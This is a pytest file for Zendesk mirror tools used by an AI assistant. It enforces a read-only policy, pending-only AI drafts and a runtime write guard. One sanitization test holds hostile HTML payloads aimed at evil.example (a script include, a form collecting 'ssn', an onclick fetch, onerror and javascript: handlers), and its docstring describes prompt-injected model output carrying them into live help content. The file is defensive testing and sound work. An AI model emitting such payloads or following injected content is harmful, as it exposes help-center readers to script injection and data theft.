"""WS5 — Renn Zendesk mirror tools (zendesk-clone-web) + the READ-ONLY lockout.

Locks: registration on BOTH dispatch paths (registry + chat_mcp_server
TOOL_SCHEMAS with additionalProperties:false) plus the Claude-path mirror
(TOOL_DEFINITIONS/_DISPATCH); strict-schema rejection of extra/missing args;
empty-mirror degrade (zendesk_mirror_empty); propose_* creating PENDING
drafts with mandatory rationale + sources and rejecting unknown target ids;
MCP-path transaction safety (dispatch with the connection already inside an
open transaction — no atomic() nesting raise); comment_value_html
replacement (never duplicated); the `results` telemetry alias on
list-returning tools; the no-status-authority guarantee; propose-created
drafts invisible to the native tab's list defaults; and the repointed
legacy zendesk tools reading the mirror with ZERO network calls.

Plus the OWNER-LOCKED read-only policy (2026-07-26): Zendesk is one-way —
content comes IN (pull/import), nothing goes OUT. ``TestZendeskWriteLockout``
enumerates EVERY tool on BOTH dispatch paths (registry + chat_mcp_server
TOOL_SCHEMAS + claude_tools TOOL_DEFINITIONS) and fails the build if a new
zendesk tool appears, if any zendesk tool name/description offers publishing
or pushing, if the read-only wording is dropped, or if any module on the Renn
tool path names a live-client write symbol. ``TestRuntimeWriteGuard`` covers
the defense-in-depth runtime fence. Guru/Asana write paths are out of scope
here by design and are NOT asserted against.
"""

import io
import json
import re
import tokenize
from pathlib import Path

import pytest

from src.data import zendesk_store
from src.data.chat_tools import registry
from src.data.chat_tools import zendesk_mirror_tools as zmt

ROOT = Path(__file__).resolve().parent.parent

NEW_TOOLS = ("search_zendesk_mirror", "get_zendesk_article",
             "get_zendesk_macro", "propose_article_update",
             "propose_macro_update", "list_zendesk_revisions")

LEGACY_TOOLS = ("search_zendesk_articles", "list_zendesk_articles",
                "list_zendesk_macros")

# The COMPLETE Zendesk tool surface Renn may ever see. Adding a tool here is
# a policy decision, not a refactor: it must be mirror-only and read-only.
ZENDESK_TOOLS = frozenset(NEW_TOOLS) | frozenset(LEGACY_TOOLS)

# propose_* carry no "zendesk" in the name but are part of the family.
_UNNAMED_FAMILY = frozenset({"propose_article_update", "propose_macro_update"})

# Every module a Renn Zendesk tool call executes inside of.
TOOL_PATH_MODULES = (
    Path("src/data/chat_tools/zendesk_mirror_tools.py"),
    Path("src/data/chat_tools/enablement_tools.py"),
    Path("src/data/chat_tools/registry.py"),
    Path("src/llm/claude_tools.py"),
    Path("src/mcp/chat_mcp_server.py"),
)

# Live-Zendesk write symbols. None of these may appear as a CODE identifier
# in any module on the tool path (prose in docstrings/comments is fine —
# that is how the policy is explained to the next reader).
BANNED_CODE_IDENTIFIERS = frozenset({
    "create_article", "update_article", "delete_article",
    "create_macro", "update_macro", "delete_macro",
    "publish_article_draft", "publish_macro_draft", "set_draft_status",
    "_write", "ZendeskClient", "zendesk_client",
})

_NEGATIONS = ("no ", "not ", "never", "cannot", "can not", "nothing",
              "n't", "no tool")


def _tool_names_and_descs():
    """{path_label: {tool_name: description}} for BOTH dispatch paths."""
    from src.data.chat_tools import registry as reg
    from src.llm.claude_tools import TOOL_DEFINITIONS
    from src.mcp.chat_mcp_server import TOOL_SCHEMAS
    return {
        "registry": {n: d.get("description", "")
                     for n, d in reg.get_tool_registry().items()},
        "chat_mcp_server.TOOL_SCHEMAS": {t["name"]: t.get("description", "")
                                         for t in TOOL_SCHEMAS},
        "claude_tools.TOOL_DEFINITIONS": {t["name"]: t.get("description", "")
                                          for t in TOOL_DEFINITIONS},
    }


def _family(names) -> set:
    return ({n for n in names if "zendesk" in n.lower()}
            | (set(names) & _UNNAMED_FAMILY))


def _publish_claims(desc: str) -> list:
    """Occurrences of publish/push NOT inside a negation ('no tool can …').

    'pushed' is stripped first: it is the legacy draft-status literal, a
    past-tense label in an enum, never an offer to do something.
    """
    low = re.sub(r"pushed", "<legacy-status>", desc, flags=re.I).lower()
    out = []
    for m in re.finditer(r"publish\w*|push\w*", low):
        window = low[max(0, m.start() - 90):m.start()]
        if not any(neg in window for neg in _NEGATIONS):
            out.append(low[max(0, m.start() - 90):m.end() + 30])
    return out


def _code_identifiers(rel_path: Path) -> set:
    src = (ROOT / rel_path).read_text(encoding="utf-8")
    return {t.string for t in
            tokenize.generate_tokens(io.StringIO(src).readline)
            if t.type == tokenize.NAME}

ARTICLE = {"id": 101, "title": "Setting up SSO",
           "body_html": "<p>alpha tunnel body</p>", "section_id": 9,
           "html_url": "https://x/101", "updated_at": "2026-07-01",
           "label_names": ["sso"]}

MACRO = {"id": 201, "title": "Refund apology", "description": "say sorry",
         "active": True, "updated_at": "2026-06-12",
         "actions": [{"field": "comment_value",
                      "value": "We are sorry about the refund delay"}]}

HTML_MACRO = {"id": 202, "title": "Escalation html", "active": True,
              "updated_at": "2026-06-13",
              "actions": [{"field": "comment_value_html",
                           "value": "<p>old html reply</p>"},
                          {"field": "status", "value": "solved"}]}


@pytest.fixture()
def mirror_db(empty_db):
    conn = empty_db.conn
    zendesk_store.upsert_articles(conn, [dict(ARTICLE)])
    zendesk_store.upsert_macros(conn, [dict(MACRO), dict(HTML_MACRO)])
    zendesk_store.upsert_sections(
        conn, [{"id": 9, "category_id": 1, "name": "FAQ"}])
    zendesk_store.upsert_categories(conn, [{"id": 1, "name": "General"}])
    return empty_db


@pytest.fixture()
def no_network(monkeypatch):
    """Any urlopen anywhere fails the test — the mirror tools are offline."""
    calls = []

    def _bomb(*a, **k):
        calls.append(a)
        raise AssertionError("network call attempted by a mirror tool")

    monkeypatch.setattr("urllib.request.urlopen", _bomb)
    return calls


# ── registration on both dispatch paths ──────────────────────────────

class TestRegistration:
    def test_registered_in_registry(self):
        tools = registry.get_tool_registry()
        for name in NEW_TOOLS:
            assert name in tools, f"{name} missing from the chat registry"

    def test_registered_in_mcp_schemas_with_strict_validation(self):
        from src.mcp.chat_mcp_server import TOOL_SCHEMAS
        by_name = {t["name"]: t for t in TOOL_SCHEMAS}
        for name in NEW_TOOLS:
            assert name in by_name, f"{name} missing from TOOL_SCHEMAS"
            schema = by_name[name]["inputSchema"]
            assert schema.get("additionalProperties") is False, (
                f"{name} must opt into strict validation")

    def test_mirrored_into_claude_tools(self):
        from src.llm.claude_tools import TOOL_DEFINITIONS, _DISPATCH
        def_names = {t["name"] for t in TOOL_DEFINITIONS}
        for name in NEW_TOOLS:
            assert name in def_names, f"{name} missing from TOOL_DEFINITIONS"
            assert name in _DISPATCH, f"{name} missing from _DISPATCH"

    def test_strict_schema_rejects_extra_args(self, mirror_db, monkeypatch):
        monkeypatch.setattr(registry, "_STRICT_SCHEMAS", None)
        res = json.loads(registry.dispatch_tool(
            "search_zendesk_mirror", {"query": "sso", "bogus": 1},
            mirror_db.conn))
        assert "invalid_arguments" in res.get("error", "")

    def test_strict_schema_rejects_missing_rationale(self, mirror_db,
                                                     monkeypatch):
        monkeypatch.setattr(registry, "_STRICT_SCHEMAS", None)
        res = json.loads(registry.dispatch_tool(
            "propose_article_update",
            {"title": "T", "body_markdown": "B"}, mirror_db.conn))
        assert "invalid_arguments" in res.get("error", "")
        assert "rationale" in res.get("error", "")

    def test_status_arg_cannot_ride_a_propose_call(self, mirror_db,
                                                   monkeypatch):
        """The schema has no status property, so a model can never smuggle a
        status transition through a propose call on the strict path."""
        monkeypatch.setattr(registry, "_STRICT_SCHEMAS", None)
        res = json.loads(registry.dispatch_tool(
            "propose_article_update",
            {"title": "T", "body_markdown": "B", "rationale": "R",
             "status": "copied"}, mirror_db.conn))
        assert "invalid_arguments" in res.get("error", "")


# ── empty-mirror degrade ─────────────────────────────────────────────

class TestEmptyMirrorDegrade:
    def test_search_mirror_degrades(self, empty_db):
        res = zmt.handle_search_zendesk_mirror(
            empty_db.conn, {"query": "sso"}, {})
        assert res == {"ok": False, "error": "zendesk_mirror_empty",
                       "hint": "Import a Help Center export or run the pull."}

    def test_get_tools_degrade(self, empty_db):
        art = zmt.handle_get_zendesk_article(
            empty_db.conn, {"article_id": 101}, {})
        assert art["ok"] is False and art["error"] == "zendesk_mirror_empty"
        mac = zmt.handle_get_zendesk_macro(
            empty_db.conn, {"macro_id": 201}, {})
        assert mac["ok"] is False and mac["error"] == "zendesk_mirror_empty"

    def test_repointed_legacy_tools_degrade(self, empty_db):
        from src.data.chat_tools import enablement_tools as ET
        for res in (ET._search_zendesk_articles_impl(empty_db.conn, "sso"),
                    ET._list_zendesk_articles_impl(empty_db.conn),
                    ET._list_zendesk_macros_impl(empty_db.conn)):
            assert res["ok"] is False
            assert res["error"] == "zendesk_mirror_empty"
            assert "hint" in res


# ── search + reads (mirror-only, offline) ────────────────────────────

class TestSearchAndReads:
    def test_search_finds_both_families_with_counts_and_alias(
            self, mirror_db, no_network):
        res = zmt.handle_search_zendesk_mirror(
            mirror_db.conn, {"query": "tunnel sorry"}, {})
        assert res["ok"] is True
        assert [a["id"] for a in res["articles"]] == [101]
        assert res["articles"][0]["section"] == "FAQ"
        assert "tunnel" in res["articles"][0]["snippet"]
        assert 201 in [m["id"] for m in res["macros"]]
        assert res["counts"] == {"articles": len(res["articles"]),
                                 "macros": len(res["macros"])}
        # results telemetry alias = articles + macros concatenated
        assert res["results"] == res["articles"] + res["macros"]

    def test_search_kind_filter(self, mirror_db):
        res = zmt.handle_search_zendesk_mirror(
            mirror_db.conn, {"query": "tunnel", "kind": "articles"}, {})
        assert res["articles"] and res["macros"] == []

    def test_search_requires_query(self, mirror_db):
        res = zmt.handle_search_zendesk_mirror(mirror_db.conn, {}, {})
        assert res["ok"] is False and res["error"] == "query_required"

    def test_get_article_full_shape(self, mirror_db, no_network):
        res = zmt.handle_get_zendesk_article(
            mirror_db.conn, {"article_id": 101}, {})
        assert res["ok"] is True
        art = res["article"]
        assert art["id"] == 101 and art["title"] == "Setting up SSO"
        assert art["section"] == "FAQ" and art["category"] == "General"
        assert art["labels"] == ["sso"]
        assert art["body_text"] == "alpha tunnel body"
        assert art["html_url"] == "https://x/101"
        assert art["origin"] == "pull"
        assert art["open_revisions"] == 0

    def test_get_article_unknown_id(self, mirror_db):
        res = zmt.handle_get_zendesk_article(
            mirror_db.conn, {"article_id": 999}, {})
        assert res["ok"] is False and res["error"] == "article_not_found"

    def test_get_macro_full_shape(self, mirror_db, no_network):
        res = zmt.handle_get_zendesk_macro(
            mirror_db.conn, {"macro_id": 201}, {})
        assert res["ok"] is True
        mac = res["macro"]
        assert mac["id"] == 201 and mac["name"] == "Refund apology"
        assert mac["active"] is True
        assert mac["actions"] == MACRO["actions"]

    def test_get_macro_unknown_id(self, mirror_db):
        res = zmt.handle_get_zendesk_macro(
            mirror_db.conn, {"macro_id": 999}, {})
        assert res["ok"] is False and res["error"] == "macro_not_found"


# ── propose_* — pending drafts with provenance, no status authority ──

class TestPropose:
    def test_propose_new_article(self, mirror_db):
        res = zmt.handle_propose_article_update(
            mirror_db.conn,
            {"title": "New SSO guide", "body_markdown": "# Heading\n\nBody.",
             "rationale": "No SSO article covers SAML.",
             "sources": [{"ref": "doc:abc", "label": "SSO runbook"}]}, {})
        assert res["ok"] is True and res["status"] == "pending"
        assert res["target"] == "new"
        d = zendesk_store.get_article_draft(mirror_db.conn, res["draft_id"])
        assert d["status"] == "pending"
        assert d["rationale"] == "No SSO article covers SAML."
        assert json.loads(d["sources_json"]) == [
            {"ref": "doc:abc", "label": "SSO runbook"}]
        assert d["body"] == "# Heading\n\nBody."
        assert d["body_html"] and "<" in d["body_html"]  # markdown rendered
        assert d["article_id"] is None

    def test_proposed_body_html_is_sanitized_at_the_write(self, mirror_db):
        """VARIANT 2 regression. propose_article_update used to store
        ``markdown_to_html(body_md)`` RAW, and markdown passes HTML blocks
        straight through — so an LLM-authored (or prompt-injected) body put
        <script src>, <form action>, <object data>, <meta refresh>,
        <style>url()</style> and inline event handlers into body_html.
        Those bytes are copy-exact material a specialist pastes into live
        Zendesk by hand, and the readable review diff showed NO row for any
        of them. Sanitize now runs at the WRITE, so the bytes never exist.
        """
        from src.data.html_sanitize import sanitize_html
        body_md = (
            "Normal paragraph.\n\n"
            '<script src="https://evil.example/x.js"></script>\n\n'
            '<form action="https://evil.example/collect">'
            '<input name="ssn"></form>\n\n'
            '<object data="https://evil.example/o"></object>\n\n'
            '<meta http-equiv="refresh" content="0;url=https://evil.example">'
            "\n\n<style>body{background:url(https://evil.example/b)}</style>"
            '\n\n<p onclick="fetch(\'https://evil.example\')">Click</p>\n\n'
            '<img src="x" onerror="alert(1)">\n\n'
            '<a href="javascript:alert(1)">go</a>\n')
        res = zmt.handle_propose_article_update(
            mirror_db.conn,
            {"title": "Hostile", "body_markdown": body_md,
             "rationale": "attack payload"}, {})
        assert res["ok"] is True and res["status"] == "pending"
        d = zendesk_store.get_article_draft(mirror_db.conn, res["draft_id"])
        stored = d["body_html"]
        low = stored.lower()
        for banned in ("<script", "<form", "<input", "<object", "<meta",
                       "<style", "onclick", "onerror", "javascript:",
                       "evil.example/x.js", "evil.example/collect",
                       "evil.example/o", "evil.example/b"):
            assert banned not in low, banned
        # idempotent: the stored bytes are already a sanitize fixed point,
        # so stored == renderable everywhere downstream
        assert stored == sanitize_html(stored)
        assert "Normal paragraph." in stored
        # the markdown source is kept verbatim on purpose — it is the
        # provenance record, and it is never the clipboard payload
        assert d["body"] == body_md

    def test_propose_macro_reply_lands_verbatim_in_the_actions(self,
                                                               mirror_db):
        """The macro reply is TEXT, not HTML: it must not be escaped or
        rewritten (that would corrupt a legitimate reply). Its safety comes
        from the review surface instead — the macro source diff renders the
        exact action bytes and the clipboard is hash-bound to them."""
        reply = "Use < and > freely; we quote them: 5 < 7."
        res = zmt.handle_propose_macro_update(
            mirror_db.conn,
            {"name": "Quoting", "reply": reply, "rationale": "why"}, {})
        assert res["ok"] is True
        d = zendesk_store.get_macro_draft(mirror_db.conn, res["draft_id"])
        assert d["actions"][0] == {"field": "comment_value", "value": reply}

    def test_propose_article_update_targets_mirror_row(self, mirror_db):
        res = zmt.handle_propose_article_update(
            mirror_db.conn,
            {"title": "Setting up SSO (SAML)", "body_markdown": "New body.",
             "rationale": "Steps stale after July release.",
             "article_id": 101}, {})
        assert res["ok"] is True and res["target"] == "update"
        d = zendesk_store.get_article_draft(mirror_db.conn, res["draft_id"])
        assert d["article_id"] == 101
        assert d["section_id"] == 9  # carried from the mirror row
        # ...and the article now reports one open revision
        art = zmt.handle_get_zendesk_article(
            mirror_db.conn, {"article_id": 101}, {})["article"]
        assert art["open_revisions"] == 1

    def test_propose_rejects_unknown_article_id(self, mirror_db):
        res = zmt.handle_propose_article_update(
            mirror_db.conn,
            {"title": "T", "body_markdown": "B", "rationale": "R",
             "article_id": 999}, {})
        assert res["ok"] is False and res["error"] == "article_not_found"
        assert zendesk_store.list_revisions(mirror_db.conn) == []

    def test_rationale_mandatory_even_off_the_strict_path(self, mirror_db):
        """The Claude execute_tool path skips schema validation — the handler
        itself must refuse a missing rationale."""
        res = zmt.handle_propose_article_update(
            mirror_db.conn,
            {"title": "T", "body_markdown": "B", "rationale": "  "}, {})
        assert res["ok"] is False and res["error"] == "rationale_required"
        mres = zmt.handle_propose_macro_update(
            mirror_db.conn, {"name": "N", "reply": "R"}, {})
        assert mres["ok"] is False and mres["error"] == "rationale_required"

    def test_propose_macro_update_preserves_non_comment_actions(
            self, mirror_db):
        res = zmt.handle_propose_macro_update(
            mirror_db.conn,
            {"name": "Refund apology v2", "reply": "New reply text",
             "rationale": "Tone update.", "macro_id": 201}, {})
        assert res["ok"] is True and res["status"] == "pending"
        d = zendesk_store.get_macro_draft(mirror_db.conn, res["draft_id"])
        assert d["actions"][0] == {"field": "comment_value",
                                   "value": "New reply text"}
        assert d["macro_id"] == 201 and d["rationale"] == "Tone update."

    def test_propose_macro_replaces_comment_value_html_never_duplicates(
            self, mirror_db):
        """A comment_value_html-only macro gets its reply REPLACED — the old
        html action must not ride along as a second reply."""
        res = zmt.handle_propose_macro_update(
            mirror_db.conn,
            {"name": "Escalation html v2", "reply": "Plain new reply",
             "rationale": "Replace the html reply.", "macro_id": 202}, {})
        assert res["ok"] is True
        d = zendesk_store.get_macro_draft(mirror_db.conn, res["draft_id"])
        comment_actions = [a for a in d["actions"]
                           if a.get("field") in ("comment_value",
                                                 "comment_value_html")]
        assert comment_actions == [{"field": "comment_value",
                                    "value": "Plain new reply"}]
        # the non-comment action is preserved
        assert {"field": "status", "value": "solved"} in d["actions"]

    def test_propose_rejects_unknown_macro_id(self, mirror_db):
        res = zmt.handle_propose_macro_update(
            mirror_db.conn,
            {"name": "N", "reply": "R", "rationale": "why",
             "macro_id": 999}, {})
        assert res["ok"] is False and res["error"] == "macro_not_found"

    def test_propose_drafts_invisible_to_native_tab_defaults(self, mirror_db):
        """Rationale-bearing drafts never appear in the native lists, so the
        native Push button (live API write) is unreachable for AI content."""
        a = zmt.handle_propose_article_update(
            mirror_db.conn, {"title": "T", "body_markdown": "B",
                             "rationale": "R"}, {})
        m = zmt.handle_propose_macro_update(
            mirror_db.conn, {"name": "N", "reply": "Re",
                             "rationale": "R"}, {})
        assert a["ok"] and m["ok"]
        assert zendesk_store.list_article_drafts(mirror_db.conn) == []
        assert zendesk_store.list_macro_drafts(mirror_db.conn) == []
        assert len(zendesk_store.list_article_drafts(
            mirror_db.conn, include_ai=True)) == 1
        assert len(zendesk_store.list_macro_drafts(
            mirror_db.conn, include_ai=True)) == 1


# ── MCP-path transaction safety ──────────────────────────────────────

class TestMcpPathTransactionSafety:
    def test_dispatch_inside_open_transaction_does_not_raise(self, mirror_db):
        """The chat_mcp_server dispatcher may hold an open implicit
        transaction — propose_* must ride the store's _txn pass-through
        (an atomic() nest would raise RuntimeError and surface as error)."""
        conn = mirror_db.conn
        conn.execute("BEGIN")
        assert conn.in_transaction
        res = json.loads(registry.dispatch_tool(
            "propose_article_update",
            {"title": "T", "body_markdown": "B", "rationale": "mcp path"},
            conn))
        assert res.get("ok") is True, res
        assert isinstance(res.get("draft_id"), int)
        if conn.in_transaction:
            conn.commit()

    def test_direct_handler_inside_open_transaction_persists_on_commit(
            self, mirror_db):
        """Pass-through semantics: the commit belongs to the caller (the MCP
        dispatcher), and the draft lands once it commits."""
        conn = mirror_db.conn
        conn.execute("BEGIN")
        res = zmt.handle_propose_macro_update(
            conn, {"name": "Txn macro", "reply": "Re",
                   "rationale": "txn"}, {})
        assert res["ok"] is True
        conn.commit()
        d = zendesk_store.get_macro_draft(conn, res["draft_id"])
        assert d is not None and d["status"] == "pending"


# ── revisions lister ─────────────────────────────────────────────────

class TestListRevisions:
    def test_lists_unified_rows_with_results_alias(self, mirror_db):
        zmt.handle_propose_article_update(
            mirror_db.conn, {"title": "A", "body_markdown": "B",
                             "rationale": "Ra", "article_id": 101}, {})
        zmt.handle_propose_macro_update(
            mirror_db.conn, {"name": "M", "reply": "Re",
                             "rationale": "Rm", "macro_id": 201}, {})
        res = zmt.handle_list_zendesk_revisions(mirror_db.conn, {}, {})
        assert res["ok"] is True and res["count"] == 2
        kinds = {r["kind"] for r in res["revisions"]}
        assert kinds == {"article", "macro"}
        art = next(r for r in res["revisions"] if r["kind"] == "article")
        assert art["target_id"] == 101
        assert art["target_title"] == "Setting up SSO"
        assert art["status"] == "pending" and art["rationale"] == "Ra"
        assert res["results"] == res["revisions"]  # telemetry alias

    def test_kind_and_status_filters(self, mirror_db):
        zmt.handle_propose_article_update(
            mirror_db.conn, {"title": "A", "body_markdown": "B",
                             "rationale": "R"}, {})
        only_macros = zmt.handle_list_zendesk_revisions(
            mirror_db.conn, {"kind": "macro"}, {})
        assert only_macros["revisions"] == []
        pend = zmt.handle_list_zendesk_revisions(
            mirror_db.conn, {"status": "pending"}, {})
        assert pend["count"] == 1
        bad = zmt.handle_list_zendesk_revisions(
            mirror_db.conn, {"status": "published"}, {})
        assert bad["ok"] is False and bad["error"] == "invalid_status"

    def test_empty_is_ok_not_degrade(self, empty_db):
        """Revisions can exist independently of mirror content — an empty
        result is an empty list, not zendesk_mirror_empty."""
        res = zmt.handle_list_zendesk_revisions(empty_db.conn, {}, {})
        assert res == {"ok": True, "count": 0, "revisions": [], "results": []}


# ── no status authority + no network (structural) ────────────────────

class TestNoStatusAuthorityAndNoNetwork:
    def test_module_source_has_no_status_or_write_reach(self):
        """Structural scan over CODE tokens (docstrings/comments may name the
        banned identifiers as prose — actual code must never reference them)."""
        import io
        import tokenize
        src = (ROOT / "src" / "data" / "chat_tools"
               / "zendesk_mirror_tools.py").read_text(encoding="utf-8")
        code = " ".join(
            t.string for t in tokenize.generate_tokens(
                io.StringIO(src).readline)
            if t.type not in (tokenize.COMMENT, tokenize.STRING))
        for token in ("set_draft_status", "publish_article_draft",
                      "publish_macro_draft", "create_article",
                      "update_article", "create_macro", "update_macro",
                      "_write", "urlopen", "ZendeskClient", "atomic"):
            assert token not in code, (
                f"zendesk_mirror_tools code must never reference {token}")

    def test_proposed_draft_stays_pending_through_every_tool(self, mirror_db):
        conn = mirror_db.conn
        res = zmt.handle_propose_article_update(
            conn, {"title": "T", "body_markdown": "B", "rationale": "R",
                   "article_id": 101}, {})
        did = res["draft_id"]
        zmt.handle_search_zendesk_mirror(conn, {"query": "tunnel"}, {})
        zmt.handle_get_zendesk_article(conn, {"article_id": 101}, {})
        zmt.handle_get_zendesk_macro(conn, {"macro_id": 201}, {})
        zmt.handle_list_zendesk_revisions(conn, {}, {})
        d = zendesk_store.get_article_draft(conn, did)
        assert d["status"] == "pending"

    def test_new_tools_never_touch_the_network(self, mirror_db, no_network):
        conn = mirror_db.conn
        zmt.handle_search_zendesk_mirror(conn, {"query": "tunnel"}, {})
        zmt.handle_get_zendesk_article(conn, {"article_id": 101}, {})
        zmt.handle_get_zendesk_macro(conn, {"macro_id": 201}, {})
        zmt.handle_propose_article_update(
            conn, {"title": "T", "body_markdown": "B", "rationale": "R"}, {})
        zmt.handle_propose_macro_update(
            conn, {"name": "N", "reply": "Re", "rationale": "R"}, {})
        zmt.handle_list_zendesk_revisions(conn, {}, {})
        assert no_network == []


# ── repointed legacy tools ───────────────────────────────────────────

class TestRepointedLegacyTools:
    def test_legacy_tools_hit_mirror_with_zero_network(self, mirror_db,
                                                       no_network):
        from src.data.chat_tools import enablement_tools as ET
        s = ET._search_zendesk_articles_impl(mirror_db.conn, "tunnel")
        assert s["ok"] is True and s["count"] == 1
        assert s["articles"][0]["id"] == 101
        assert s["articles"][0]["html_url"] == "https://x/101"
        assert s["articles"][0]["section"] == 9  # historical shape: the id

        la = ET._list_zendesk_articles_impl(mirror_db.conn)
        assert la["ok"] is True and la["total"] == 1
        assert la["articles"][0] == {"id": 101, "title": "Setting up SSO",
                                     "html_url": "https://x/101", "section": 9}

        lm = ET._list_zendesk_macros_impl(mirror_db.conn)
        assert lm["ok"] is True and lm["total"] == 2
        assert {m["id"] for m in lm["macros"]} == {201, 202}
        assert all(isinstance(m["active"], bool) for m in lm["macros"])
        assert no_network == []

    def test_legacy_list_offset_window(self, mirror_db):
        from src.data.chat_tools import enablement_tools as ET
        zendesk_store.upsert_articles(
            mirror_db.conn,
            [{"id": 102, "title": "Second", "body_html": "<p>b</p>",
              "updated_at": "2026-07-02"}])
        res = ET._list_zendesk_articles_impl(mirror_db.conn, limit=1, offset=1)
        assert res["total"] == 2 and res["count"] == 1 and res["offset"] == 1

    def test_unified_search_zendesk_arm_reads_mirror(self, mirror_db,
                                                     no_network):
        from src.data.chat_tools import enablement_tools as ET
        arm = ET._unified_zendesk_results(mirror_db.conn, "tunnel", 8)
        assert arm["status"] == "ok"
        assert arm["results"][0]["source"] == "zendesk"
        assert arm["results"][0]["id"] == 101
        assert "tunnel" in (arm["results"][0]["snippet"] or "")

    def test_unified_search_zendesk_arm_empty_mirror_status(self, empty_db):
        from src.data.chat_tools import enablement_tools as ET
        arm = ET._unified_zendesk_results(empty_db.conn, "tunnel", 8)
        assert arm["status"] == "empty_mirror" and arm["results"] == []


# ── OWNER-LOCKED read-only policy (2026-07-26) ───────────────────────

class TestZendeskWriteLockout:
    """Zendesk is READ-ONLY: one-way API, human copy-paste, no AI reach."""

    def test_zendesk_tool_surface_is_the_known_read_only_set(self):
        """Every path exposes exactly the 9 mirror-only tools. A new zendesk
        tool fails here until someone re-reads the policy."""
        for label, tools in _tool_names_and_descs().items():
            fam = _family(tools)
            missing = set(ZENDESK_TOOLS) - fam
            extra = fam - set(ZENDESK_TOOLS)
            assert not missing, f"{label} lost zendesk tools: {sorted(missing)}"
            assert not extra, (
                f"{label} exposes UNDECLARED zendesk tool(s) {sorted(extra)} — "
                "Zendesk is read-only; no new zendesk tool may ship without "
                "re-reading the owner policy in zendesk_mirror_tools.py")

    def test_no_tool_name_anywhere_offers_a_zendesk_write(self):
        write_verb = re.compile(
            r"publish|push|post|create|delete|sync|upload|write")
        for label, tools in _tool_names_and_descs().items():
            for name in tools:
                low = name.lower()
                if "zendesk" not in low:
                    continue
                assert not write_verb.search(low), (
                    f"{label}: tool name '{name}' reads like a Zendesk write")

    def test_no_zendesk_description_offers_publishing_or_pushing(self):
        """Every publish/push word in the family must sit inside a negation."""
        for label, tools in _tool_names_and_descs().items():
            for name in sorted(_family(tools)):
                claims = _publish_claims(tools[name])
                assert not claims, (
                    f"{label}: {name} description appears to OFFER "
                    f"publishing/pushing to Zendesk: {claims}")

    def test_every_zendesk_description_carries_the_read_only_language(self):
        for label, tools in _tool_names_and_descs().items():
            for name in sorted(_family(tools)):
                low = tools[name].lower()
                assert "read-only" in low, (
                    f"{label}: {name} must tell the model Zendesk is READ-ONLY")
                assert "by hand" in low, (
                    f"{label}: {name} must say a human copies content into "
                    "Zendesk by hand")

    def test_propose_results_reinforce_the_human_copy(self, mirror_db):
        art = zmt.handle_propose_article_update(
            mirror_db.conn, {"title": "T", "body_markdown": "B",
                             "rationale": "R"}, {})
        mac = zmt.handle_propose_macro_update(
            mirror_db.conn, {"name": "N", "reply": "Re", "rationale": "R"}, {})
        for res in (art, mac):
            note = res["note"].lower()
            assert "read-only" in note
            assert "by hand" in note
            assert "specialist" in note

    def test_tool_path_modules_name_no_client_write_symbol(self):
        """Prose may explain the policy; CODE may never name a write symbol."""
        for rel in TOOL_PATH_MODULES:
            hits = BANNED_CODE_IDENTIFIERS & _code_identifiers(rel)
            assert not hits, (
                f"{rel.as_posix()} references live-Zendesk write symbol(s) "
                f"{sorted(hits)} in code — Zendesk is read-only")

    def test_registry_and_mcp_agree_on_the_family(self):
        paths = _tool_names_and_descs()
        assert (_family(paths["registry"])
                == _family(paths["chat_mcp_server.TOOL_SCHEMAS"])
                == _family(paths["claude_tools.TOOL_DEFINITIONS"]))


class TestRuntimeWriteGuard:
    """Defense in depth: the tools refuse if a mutator becomes reachable."""

    ALL_CALLS = (
        ("handle_search_zendesk_mirror", {"query": "tunnel"}),
        ("handle_get_zendesk_article", {"article_id": 101}),
        ("handle_get_zendesk_macro", {"macro_id": 201}),
        ("handle_propose_article_update",
         {"title": "T", "body_markdown": "B", "rationale": "R"}),
        ("handle_propose_macro_update",
         {"name": "N", "reply": "Re", "rationale": "R"}),
        ("handle_list_zendesk_revisions", {}),
    )

    def test_guard_is_inert_in_a_clean_build(self):
        zmt.guard_mirror_only()
        assert zmt.write_reach_refusal(None) is None

    def test_guard_raises_when_this_module_holds_a_mutator(self, monkeypatch):
        monkeypatch.setattr(zmt, "create_article", lambda *a, **k: None,
                            raising=False)
        with pytest.raises(zmt.ZendeskWriteBlocked):
            zmt.guard_mirror_only()

    def test_guard_raises_for_a_sibling_module_on_the_tool_path(
            self, monkeypatch):
        from src.data.chat_tools import enablement_tools as ET
        monkeypatch.setattr(ET, "update_macro", lambda *a, **k: None,
                            raising=False)
        with pytest.raises(zmt.ZendeskWriteBlocked):
            zmt.guard_mirror_only()

    def test_guard_raises_for_an_object_carrying_a_write_method(self):
        class FakeClient:
            def create_macro(self, *a, **k):
                return None

        with pytest.raises(zmt.ZendeskWriteBlocked):
            zmt.guard_mirror_only(FakeClient())

    def test_every_mirror_tool_refuses_while_a_mutator_is_reachable(
            self, mirror_db, monkeypatch):
        monkeypatch.setattr(zmt, "update_article", lambda *a, **k: None,
                            raising=False)
        for fn_name, args in self.ALL_CALLS:
            res = getattr(zmt, fn_name)(mirror_db.conn, args, {})
            assert res["ok"] is False, fn_name
            assert res["error"] == "zendesk_write_blocked", fn_name

    def test_legacy_zendesk_tools_refuse_too(self, mirror_db, monkeypatch):
        from src.data.chat_tools import enablement_tools as ET
        monkeypatch.setattr(zmt, "publish_article_draft",
                            lambda *a, **k: None, raising=False)
        for res in (ET._search_zendesk_articles_impl(mirror_db.conn, "sso"),
                    ET._list_zendesk_articles_impl(mirror_db.conn),
                    ET._list_zendesk_macros_impl(mirror_db.conn)):
            assert res["ok"] is False
            assert res["error"] == "zendesk_write_blocked"

    def test_refusal_never_escapes_as_an_exception(self, mirror_db,
                                                   monkeypatch):
        """Registry contract: tools return dicts, they do not raise."""
        monkeypatch.setattr(zmt, "_write", lambda *a, **k: None,
                            raising=False)
        res = json.loads(registry.dispatch_tool(
            "search_zendesk_mirror", {"query": "tunnel"}, mirror_db.conn))
        assert res["error"] == "zendesk_write_blocked"
